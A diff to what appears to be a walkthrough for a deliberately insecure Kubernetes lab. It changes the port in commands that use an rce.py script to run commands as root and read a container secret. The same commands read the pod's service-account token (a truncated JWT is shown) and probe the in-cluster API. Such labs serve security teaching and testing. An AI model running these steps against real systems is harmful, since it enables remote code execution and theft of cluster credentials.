@@ -20,12 +20,12 @@
 
 ```sh
 # test
-python scripts/rce.py http://localhost:8080 id
+python scripts/rce.py http://localhost:8000 id
 # executable response:
 # uid=0(root) gid=0(root) groups=0(root)
 
 # get distro
-python scripts/rce.py http://localhost:8080 "cat /etc/os-release"
+python scripts/rce.py http://localhost:8000 "cat /etc/os-release"
 # executable response:
 # PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
 # NAME="Debian GNU/Linux"
@@ -38,7 +38,7 @@ python scripts/rce.py http://localhost:8080 "cat /etc/os-release"
 # BUG_REPORT_URL="https://bugs.debian.org/"
 
 # get pod tier flag
-python scripts/rce.py http://localhost:8080 "printenv CONTAINER_SECRET"
+python scripts/rce.py http://localhost:8000 "printenv CONTAINER_SECRET"
 # CoNtAinEr-sEcRet-InsECurE
 ```
 
@@ -48,7 +48,7 @@ python scripts/rce.py http://localhost:8080 "printenv CONTAINER_SECRET"
 
 ```sh
 # get
-python scripts/rce.py http://localhost:8080 "ls -l /var/run/secrets/kubernetes.io/serviceaccount"
+python scripts/rce.py http://localhost:8000 "ls -l /var/run/secrets/kubernetes.io/serviceaccount"
 # executable response:
 # total 0
 # lrwxrwxrwx 1 root root 13 Oct  6 02:48 ca.crt -> ..data/ca.crt
@@ -56,17 +56,17 @@ python scripts/rce.py http://localhost:8080 "ls -l /var/run/secrets/kubernetes.i
 # lrwxrwxrwx 1 root root 12 Oct  6 02:48 token -> ..data/token
 
 # get ns
-python scripts/rce.py http://localhost:8080 "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
+python scripts/rce.py http://localhost:8000 "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
 # executable response:
 # insecure
 
 # get token
-python scripts/rce.py http://localhost:8080 "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+python scripts/rce.py http://localhost:8000 "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
 # executable response:
 # eyJhbGciOiJSUzI1NiIsImtpZCI6ImF6c0RoVDZOX1JXS0hjXzAtYjBtbndIbHBlT1IwOE9rTzY1VDhkN1hkTWMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5l...
 
 # try request api
-python scripts/rce.py http://localhost:8080 "curl -sS https://kubernetes.default.svc"
+python scripts/rce.py http://localhost:8000 "curl -sS https://kubernetes.default.svc"
 # curl: (77) error setting certificate file: /etc/ssl/certs/ca-certificates.crt
 
 # request api
